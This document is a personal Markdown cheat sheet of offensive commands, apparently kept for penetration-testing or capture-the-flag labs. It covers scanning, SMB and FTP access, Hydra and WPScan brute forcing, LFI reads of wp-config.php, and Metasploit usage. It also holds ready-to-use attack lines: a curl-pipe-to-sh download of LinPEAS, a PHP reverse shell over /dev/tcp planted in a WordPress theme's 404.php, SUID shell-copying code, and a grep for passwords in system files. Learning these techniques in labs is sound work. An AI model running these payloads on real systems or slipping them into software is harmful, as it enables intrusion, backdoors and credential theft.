# Hacking Notes

---

## Configuration Files & Tools

| Description             | Command        | Syntax                                                  |
|-------------------------|----------------|----------------------------------------------------------|
| Use VPN                 | openvpn        | `openvpn [FILE.ovpn]`                                   |
| TCP Nmap Scan (no ping) | nmap           | `nmap -Pn [IP]/[RANGE]`                                 |
| UDP Nmap Scan           | nmap           | `nmap -sU [IP]/[RANGE]`                                 |
| Directory Discovery     | gobuster       | `gobuster dir -u http://[URL] -w [WORDLIST]`            |

---

## Web & Content Discovery

| Description | Command     | Syntax                   |
|-------------|-------------|--------------------------|
| Robots.txt  | curl/browser| `http://[IP]/robots.txt` |

---

## File/Data Analysis

| Description     | Command | Syntax            |
|-----------------|---------|-------------------|
| Extract strings | strings | `strings [FILE]`  |

---

## WordPress Recon

| Description       | Examples/Paths                     |
|-------------------|------------------------------------|
| Backup/Swap Files | `[file].swp`, `.bak`, `.old`, etc. |

---

## Access

| Service    | Command Syntax                                |
|------------|------------------------------------------------|
| FTP        | `ftp [IP]`                                     |
| SSH        | `ssh [user]@[IP]`                              |
| SMB List   | `smbclient -L \\\\[IP]`                        |
| SMB Access | `smbclient \\\\[IP]\\[Share]`                  |

---

## Dictionary & Wordlist Generation

| Tool | Command                   | Syntax                         |
|------|---------------------------|--------------------------------|
| cewl | Generate custom wordlist  | `cewl [URL] > wordlist.txt`    |

---

## Bruteforce Attacks

| Tool     | Description                      | Syntax                                                                                     |
|----------|----------------------------------|--------------------------------------------------------------------------------------------|
| hydra    | HTTP form brute force            | `hydra -L [USERS] -P [PASSWORDS] [IP] -s [PORT] http-post-form "[url]:...:Invalid" -V`    |
| wpscan   | WordPress login brute force      | `wpscan --url [URL] -U [USER] -P [WORDLIST]`                                               |

---

## Privilege Escalation

| Task                    | Command / Path                                                |
|-------------------------|---------------------------------------------------------------|
| Download LinPEAS        | `curl [IP]:8000/linpeas.sh | sh`                              |
| Start HTTP server       | `python3 -m http.server 8000`                                |
| Start Netcat listener   | `nc -lvnp [PORT]`                                             |
| Spawn TTY shell         | `python3 -c 'import pty; pty.spawn("/bin/bash")'`             |
| Reverse shell (PHP)     | See code block below                                          |
| Find SUID exploit       | `find . -exec /bin/sh -p \; -quit`                            |
| Make binary SUID        | `chmod u+s /tmp/bash`                                         |

#### PHP Reverse Shell Example

```php
<?php
if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}
?>
```
Access at: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`

---

## Binary Exploits (Python)

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
```

---

## Escape Restricted Shell

| Method      | Command                                |
|-------------|-----------------------------------------|
| Vim escape  | `:!/bin/sh`<br>`:set shell=/bin/bash`<br>`:shell` |
| Tab check   | Press `TAB TAB` to list allowed commands |

---

## Process Snooping Without Root

| Tool     | Description               | Command/Source                                              |
|----------|---------------------------|--------------------------------------------------------------|
| pspy     | Monitor processes         | `./pspy64s` (from [pspy GitHub](https://github.com/DominicBreuker/pspy)) |

---

## Port Scanning One-Liner (Python)

```python
python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
```

---

## SSH Tunneling

| Task              | Syntax                                 |
|-------------------|----------------------------------------|
| Dynamic tunnel    | `ssh -D [PORT] [USER]@[IP]`            |

---

## Local File Inclusion - Base64 Read

| Task                | URL Example                                                                 |
|---------------------|------------------------------------------------------------------------------|
| Base64 encode read  | `http://[IP]/page=php://filter/convert.base64-encode/resource=wp-config.php` |

---

## Metasploit Basics

| Task                | Command                                   |
|---------------------|-------------------------------------------|
| Start               | `msfconsole`                              |
| Search modules      | `search <keyword>`                        |
| Load module         | `use <module_path>`                       |
| Show options        | `show options`                            |
| Set target IP       | `set RHOSTS <target-ip>`                  |
| Set local IP        | `set LHOST <your-ip>`                     |
| Set payload         | `set PAYLOAD <payload>`                   |
| Exploit             | `run` or `exploit`                        |
| List sessions       | `sessions`                                |
| Interact with session| `sessions -i <id>`                       |

---

## SMB Examples

| Task              | Command                                  |
|-------------------|-------------------------------------------|
| List shares       | `smbclient -L \\\\[IP]`                   |
| Access share      | `smbclient \\\\[IP]\\[Share]`             |
| Use with proxy    | `proxychains smbclient \\\\[IP]\\[Share]` |

---

## Cleanup and File Checks

| Task                        | Command                            |
|-----------------------------|-------------------------------------|
| Find passwords              | `grep -i password /etc/* 2>/dev/null` |
| Check crontab               | `crontab -l`                        |
| Inspect logout script       | `vim ~/.bash_logout`               |
| Inspect user config         | `vim ~/.config/`                   |
